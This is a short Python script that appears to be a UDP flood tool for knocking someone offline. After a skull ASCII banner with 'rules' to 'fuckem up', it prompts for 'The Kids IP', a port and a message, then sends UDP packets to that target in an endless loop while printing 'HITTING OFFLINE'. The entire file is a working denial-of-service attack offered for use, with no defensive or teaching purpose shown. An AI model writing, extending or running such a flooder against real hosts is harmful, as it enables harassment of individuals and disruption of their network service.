import socket
import os
import time
import sys

os.system("clear")

print("             ;::::;")
print("           ;::::; :;")
print("         ;:::::'   :;")
print("        ;:::::;     ;.")
print("       ,:::::' coded ;           OOO\ ")
print("       ::::::; by    ;          OOOOO\ ")
print("       ;:::::; Jacob ;         OOOOOOOO")
print("      ,;::::::;     ;'         / OOOOOOO")
print("   ;:::::::::`. ,,,;.        /  / DOOOOOO")
print("  .';:::::::::::::::::;,     /  /     DOOOO")
print(" ,::::::;::::::;;;;::::;,   /  /        DOOO")
print(";`::::::`'::::::;;;::::: ,#/  /          DOOO")
print(":`:::::::`;::::::;;::: ;::#  /            DOOO")
print("::`:::::::`;:::::::: ;::::# /              DOO")
print("`:`:::::::`;:::::: ;::::::#/               DOO")
print(" :::`:::::::`;; ;:::::::::##                OO")
print(" ::::`:::::::`;::::::::;:::#                OO")
print(" `:::::`::::::::::::;'`:;::#                O")
print("  `:::::`::::::::;' /  / `:#")
print("   ::::::`:::::;'  /  /   `#")
print(" #############################")
print(" |           RULES           |")
print(" |   1.Fuckem up             |")
print(" |   2.Fuckem up harder      |")
print(" #############################")
target = input("[*] Enter The Kids IP: ")
port = input("[*] Enter The Port: ")
message = input("[*] Enter Message;): ").encode("utf-8")


while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		send = s.sendto(message,(target, int(port)))
		print ("HITTING OFFLINE")
	except Exception as E:
		print(E)
		print("[!] An Error Has Occured")
		print("[!] Exiting....")
		time.sleep(3)
		sys.exit()
